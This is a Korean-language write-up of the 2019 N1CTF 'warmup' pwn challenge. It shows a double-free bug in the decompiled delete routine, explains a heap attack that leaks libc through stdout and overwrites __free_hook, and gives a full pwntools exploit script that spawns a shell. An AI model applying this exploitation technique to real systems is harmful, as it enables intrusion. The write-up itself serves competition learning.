---
title: N1CTF warmup write up
categories: [2019, N1CTF]
tags: [CTF, pwn, heap]
---

N1CTF warmup write up  

subject   | problem
----------|------------
CTF       | 2019 N1CTF
Tags      | pwn
score     | 192
env       | ubuntu 18.04
problem   | heap, doublefree, stdbuf

# analysis  

취약점 소스는 delete 부분에서 이루어 진다.

``` c++
  printf("index:");
  v1 = readInt();
  if ( v1 >= 0 && v1 <= 9 )
  {
    if ( malloclist[v1] )
      ptr = (void *)malloclist[v1];
    if ( ptr )
    {
      free(ptr);
      malloclist[v1] = 0LL;
      puts("done!");
    }
    else
    {
      puts("no such note!");
    }
  }
```

ptr에 값이 이미 쓰어져 있다면 malloclist[v1]의 값을 널값을 주는것으로 double free가 가능하다.   
특별히 leak이 되는 함수가 없기 때문에 stdout의 IO_buf의 값을 바꾸어 leak을 한다.

# Solve
1. double free 취약점을 이용하여 chunk의 size값을 0xa0으로 변경한다. 
2. 0xa0 사이즈로 변경된 chunk를 8번 free하여 unsorted_bin으로 들어가게 한다. (tcache MAX 7)
3. unsortedbin에 남겨진 main_arena 값을 이용해서 stdout의 값을 덮는다 (0x10 브포)
4. leak이후 free_hook을 덮어서 get shell

# exploit code

``` python
#!/usr/bin/env/python
# powerprove

from pwn import *
import sys

if len(sys.argv) < 2:
    host = "localhost"
    port = 4000

def inp(data, line = 1):
    s.recvuntil(">>")
    if line == 1:    
        s.sendline(str(data))
    else:
        s.send(str(data))

def menu(index):
    inp(index)

def add(data, line = 1):
    menu(1)
    inp(data, line)

def delete(index):
    menu(2)
    s.recvuntil(":")
    s.sendline(str(index))

def modify(index, data, line = 1):
    menu(3)
    s.recvuntil(":")
    s.sendline(str(index))
    inp(data, line)

def pwn():

    for i in range(0, 4):
        add("POWERPROVE")
    add(p64(0x100) + p64(0x40))

    delete(0)
    for i in range(0, 2):
        delete(9)

    for i in range(0, 2):
        add("\x90", line = 0)
    
    payload  = "AAAAAAAA"*2
    payload += p64(0)
    payload += p64(0xa1)
    add(payload)

    delete(1)

    for i in range(0, 6):
        delete(9)
    
    delete(0)
    for i in range(0, 2):
        delete(9)
    
    for i in range(0, 2):
        add("\xf0", line = 0)

    payload = "AAAAAAAA" + p64(0xa1)
    add(payload)

    delete(2)

    delete(3)
    for i in range(0, 3):
        delete(9)
    
    for i in range(0, 2):
        add("\x00", line = 0)

    modify(7, payload + "\x60\x67", line = 0)

    add("/bin/sh\x00\x00")

    payload = p64(0x0fbad1800)
    payload += p64(0)*3
    payload += '\x00'

    add(payload, line = 0)

    s.recv(8)
    libc_base = u64(s.recv(8)) - 0x3ed8b0
    free_hook = libc_base + 0x3ed8e8
    system_addr = libc_base + 0x4f440

    log.info("libc_base        : " + str(hex(libc_base)))
    log.info("free_hook        : " + str(hex(free_hook)))
    log.info("system_addr      : " + str(hex(system_addr)))

    delete(0)
    delete(1)
    delete(5)

    for i in range(0, 2):
        add(p64(free_hook))
    
    add(p64(system_addr))
    delete(8)


if __name__ == "__main__":
    s = remote(host, port)
    sleep(4)
    pwn()
    s.interactive()

```
